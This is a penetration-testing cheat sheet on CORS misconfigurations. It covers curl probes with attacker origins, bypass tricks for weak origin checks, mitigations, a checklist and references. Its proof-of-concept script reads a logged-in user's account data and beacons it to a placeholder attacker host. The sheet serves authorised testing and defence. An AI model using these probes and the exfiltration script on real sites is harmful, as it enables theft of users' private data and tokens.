# 🌐 CORS (Cross-Origin Resource Sharing) Misconfiguration Cheat Sheet

> **Quick reference** for testing permissive cross-origin policies.

> ⚠️ **Scope note:** Test only systems you own or have explicit written permission to assess. Use placeholder origins and your own accounts; do not exfiltrate real data or credentials.

---

### 🧭 **1. Quick Reference**

| Header | Safe expectation |
|--------|------------------|
| `Access-Control-Allow-Origin` | Exact trusted origin, never `*` with credentials |
| `Access-Control-Allow-Credentials` | `true` only with an explicit origin |
| `Vary: Origin` | Present when the response varies by origin |
| `Access-Control-Allow-Methods` | Least privilege (no unnecessary `PUT`/`DELETE`) |
| `Access-Control-Allow-Headers` | Minimal allow-list |

---

### 🔍 **2. Detection**

Send a request with an attacker-controlled `Origin` and inspect the response headers.

```bash
curl -s -i -H 'Origin: <ATTACKER_ORIGIN>' \
  'https://<TARGET>/api/userinfo' | grep -i 'access-control'
```

| Response | Interpretation |
|----------|----------------|
| `ACAO: <ATTACKER_ORIGIN>` | Origin is reflected — likely exploitable |
| `ACAO: *` + `ACAC: true` | Invalid combo in browsers, but check other flaws |
| `ACAO: *`, no credentials | Public data only; still check other endpoints |
| No ACAO header | No CORS granted; check JSONP / postMessage instead |

---

### 🧪 **3. Testing Commands**

```bash
# Credentialed cross-origin request probe
curl -s -i -b 'session=<TOKEN>' \
  -H 'Origin: <ATTACKER_ORIGIN>' \
  'https://<TARGET>/api/account'

# Preflight for a non-simple method/header
curl -s -i -X OPTIONS \
  -H 'Origin: <ATTACKER_ORIGIN>' \
  -H 'Access-Control-Request-Method: PUT' \
  -H 'Access-Control-Request-Headers: authorization' \
  'https://<TARGET>/api/account'

# Null origin probe
curl -s -i -H 'Origin: null' 'https://<TARGET>/api/account'

# Subdomain / suffix trick
curl -s -i -H 'Origin: https://<TARGET>.<ATTACKER_ORIGIN>' \
  'https://<TARGET>/api/account'
```

> 💡 Test each endpoint separately: CORS policy is often configured per route or proxy.

---

### 🧩 **4. Common Misconfigurations**

| Misconfiguration | Bypass idea |
|------------------|-------------|
| Reflects any origin | Direct credentialed fetch from `<ATTACKER_ORIGIN>` |
| `ACAO: *` + `ACAC: true` | Browsers block, but check fallback/no-cookie endpoints |
| Accepts `Origin: null` | Sandboxed iframe / `data:` URL obtains `null` origin |
| Prefix check (`startsWith`) | `https://<TARGET>.evil.test` passes |
| Suffix check (`endsWith`) | `https://evil<TARGET>` passes |
| Regex not anchored | Embed trusted domain inside attacker origin |
| Trusts all subdomains | Take over an abandoned subdomain or use XSS there |
| Missing `Vary: Origin` | Cache poisoning: cached ACAO served to other origins |

```html
<!-- 🎯 Exploitation PoC (own accounts only) -->
<script>
fetch('https://<TARGET>/api/account', {
  credentials: 'include'
})
.then(r => r.text())
.then(data => {
  // Demonstrate only: send to a controlled collector
  navigator.sendBeacon('https://<ATTACKER_ORIGIN>/collect', data);
});
</script>
```

---

### 🖥️ **5. Validation Flow**

1. Host the PoC on `<ATTACKER_ORIGIN>` while logged into `<TARGET>` as `<USER>`.
2. Open the page in a browser with the victim session cookie present.
3. Confirm the response body is readable in JavaScript (not blocked by CORS).
4. Record status, headers, and which fields were exposed.
5. Check whether the same policy applies to authenticated and unauthenticated routes.

```bash
# Verify whether the session cookie permits credentialed use
curl -s -i -b 'session=<TOKEN>' -H 'Origin: <ATTACKER_ORIGIN>' \
  'https://<TARGET>/api/secret' | head -20
```

---

### 💥 **6. Impact**

- Theft of authenticated API responses (PII, tokens, private messages).
- Cross-origin state changes when methods/headers are also allowed.
- CSRF amplification: custom headers become sendable cross-origin.
- Cache poisoning when `Vary: Origin` is absent.
- Exposure of internal endpoints reachable only from a trusted network.

---

### 🛡️ **7. Mitigation**

- Maintain a strict allow-list of exact origins; echo only validated values.
- Never combine wildcard `ACAO` with `Allow-Credentials: true`.
- Reject `null` and unrecognized origins; anchor regexes (`^https://...$`) carefully.
- Restrict methods and headers; deny unnecessary preflight permissions.
- Add `Vary: Origin` to every origin-dependent response.
- Separate public and authenticated APIs with distinct CORS policies.
- Use `SameSite` cookies and CSRF tokens as defense in depth.

---

### ✅ **8. Testing Checklist**

- [ ] Arbitrary origin reflected
- [ ] Null origin accepted
- [ ] Prefix/suffix/regex bypasses tried
- [ ] Subdomain trust evaluated
- [ ] Preflight methods/headers enumerated
- [ ] Credentialed request verified in browser
- [ ] `Vary: Origin` checked
- [ ] Public vs authenticated routes compared

---

### 📚 **9. References**

- [PortSwigger: Cross-origin resource sharing (CORS)](https://portswigger.net/web-security/cors)
- [MDN: Cross-Origin Resource Sharing](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
- [OWASP: Cross-Origin Resource Sharing Misconfiguration](https://owasp.org/www-community/vulnerabilities/CORS_Misconfiguration)
- [CWE-942: Permissive Cross-domain Policy](https://cwe.mitre.org/data/definitions/942.html)

---

**🌐 Keep origins in bounds.**
